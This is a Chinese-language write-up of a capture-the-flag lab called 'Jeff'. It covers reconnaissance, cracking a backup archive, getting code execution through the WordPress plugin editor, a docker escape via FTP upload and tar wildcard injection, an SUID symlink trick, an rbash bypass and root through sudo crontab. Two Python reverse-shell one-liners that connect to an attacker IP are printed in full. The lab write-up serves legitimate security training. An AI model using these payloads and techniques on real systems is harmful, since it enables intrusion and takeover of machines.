# Jeff

你能破解杰夫的网络服务器吗？

如果你发现自己在暴力破解SSH，你就做错了。

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/533ba8be462d4090b070b187829c75e0.png)

进80，是一个空页面，查看源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/0ea3a5ea90d94e2ca0158da512a75476.png)

将jeff.thm加入hosts

![在这里插入图片描述](https://img-blog.csdnimg.cn/0caae1073fe04c84a23916d55ea32b56.png)

上gobuster

![在这里插入图片描述](https://img-blog.csdnimg.cn/4c2073c508f1484b9ee04998339b3bbf.png)

/admin是空页面，/backups也没东西，/uploads是文件上传点

然而连upload也是假的

![在这里插入图片描述](https://img-blog.csdnimg.cn/52333326390741b5a6e83cf6c38661dd.png)

扫admin/，login.php还是空的

![在这里插入图片描述](https://img-blog.csdnimg.cn/a5a23b4b07ca42f8ad638de65e7f2866.png)

扫/backups/

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d66dfdc7b084e7294093cf2d92483e9.png)

把backup.zip下下来，需要密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d32a24a5baf49c1ac03a037d5fe56af.png)

zip2john后直接爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/68ec2958495948b1aa99aea7b63e5b59.png)

查看bak得到wp密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/3e916a7367ae4b5eb91c3b47cf7c3dfe.png)

现在就差wp站点没找到，不出意外应该是vhost，直接上ffuf

![在这里插入图片描述](https://img-blog.csdnimg.cn/a28fb1b57f09435c8a707065afea2211.png)

把wordpress子域加进hosts

![在这里插入图片描述](https://img-blog.csdnimg.cn/9844b2e47f2f4d05a3a7f17f9389c545.png)

进到wp并且利用刚刚的凭据登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/09114826034242f2bcbc6def4e76ed68.png)

无法通过改页面getshell

![在这里插入图片描述](https://img-blog.csdnimg.cn/994bda69e3c4446295ecdcbe4ff89f90.png)

这里利用插件编辑器改插件index.php

![在这里插入图片描述](https://img-blog.csdnimg.cn/5a240a2ad43f430091a2a0fc53e15b72.png)

但akismet这个目录无权访问

![在这里插入图片描述](https://img-blog.csdnimg.cn/faeb71adf7034d969f1d283f884cfb01.png)

换另一个插件，同样的方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/29ecc36c4c414980870a5d829094321f.png)

访问hello.php

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f8a1c3327944187bd905732df09d89f.png)

没问题，直接reverse shell

python3.7可用

![在这里插入图片描述](https://img-blog.csdnimg.cn/57ba15e4dfee4a018037bce2a3a7171e.png)

payload:

	python3.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

![在这里插入图片描述](https://img-blog.csdnimg.cn/6062b5fdc077495c8b5dcdf8ac393e78.png)

## docker逃逸

在家目录的html下有一个root的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/1757841566864be2b37d84c1b5302d84.png)

```php
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuXXXXXXxXXXXXXXX3!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}
```

很明显，172.20.0.1应该就是宿主机，而该php文件将连接到宿主机的ftp并上传一些文件去备份

这里没有ftp，我们可以用curl

![在这里插入图片描述](https://img-blog.csdnimg.cn/824b045b507248d9868a5762b60674d9.png)

这里上传文件后，如何进行备份是一个更值得关注的地方

在以往，我们通过所谓备份来提权的应该就是tar的通配符注入了

如果这里也是tar把ftp上传的文件进行备份，那么我们将直接逃逸到宿主机，获得宿主机的shell

hack.sh

```bash
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/89788aff752c40a382799f9611905f1e.png)

base64编码解码写入hack.sh

![在这里插入图片描述](https://img-blog.csdnimg.cn/164e260f1a2b4a2db507b37194bf8ff3.png)

上传ftp

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf6367cdb12348f39ceaceaa0013d74f.png)

成功过来

![在这里插入图片描述](https://img-blog.csdnimg.cn/e7e458253bde499ca0f00e4b40f98924.png)

## 横向移动

看到用户名是backupmgr，一下联想到了/var/backups，在/var/backups下有个bak，但目前无权查看

![在这里插入图片描述](https://img-blog.csdnimg.cn/61a94ac183af494392148d07f39af0e6.png)

/opt

![在这里插入图片描述](https://img-blog.csdnimg.cn/c70ffffaeae940c1bdc62e97525df1b8.png)

进到systools，查看message.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f4dc2e626b843deac5cc19c241fe001.png)

systool是一个可执行文件并且带jeff的suid，可以查看进程和“重置jeff的密码”

![在这里插入图片描述](https://img-blog.csdnimg.cn/aa6ca0b27d4843d6ad01fae05ace1e43.png)

而systool会读取message.txt，并且message.txt我们有所有权

![在这里插入图片描述](https://img-blog.csdnimg.cn/8a7475739e8c4e47b3cb3cb1f1a12778.png)

联合上面发现的jeff.bak，我们可以通过ln将message.txt链接到jeff.bak来读取其内容

![在这里插入图片描述](https://img-blog.csdnimg.cn/e16ea49c815c4592b48d696cd309aa2c.png)

再次执行systool，获得jeff的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/9231ccc3ec144f61afdd5fca171f7ce1.png)

ssh登过去，发现ssh的shell受限, 是rbash，什么都干不了

![在这里插入图片描述](https://img-blog.csdnimg.cn/7a2e741093fe44c0bc3f648cbcc67749.png)

通过刚刚的shell直接su过去，发现至少还能执行一些命令

发现只禁止了/，环境变量并没有被破坏，直接bash获得bash

![在这里插入图片描述](https://img-blog.csdnimg.cn/fb5ef1662b2e4955ab436e923e364df3.png)

拿到user flag，但是这个flag是错误的，看到flag里面有个Hash Me两个字眼果断将其MD5

![在这里插入图片描述](https://img-blog.csdnimg.cn/b098771a890342fba63e99ff17116375.png)

再次提交，成功

## 权限提升

查看sudo -l

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f229584ca26487299a310bec22d00e2.png)

久违的crontab -e提权

进到vim之后直接:!/bin/bash

![在这里插入图片描述](https://img-blog.csdnimg.cn/78ed08eddd9742608b48594e50002fef.png)

成功到root，拿到root flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c40edbc2bf14cdd8805f603d2f123e5.png)
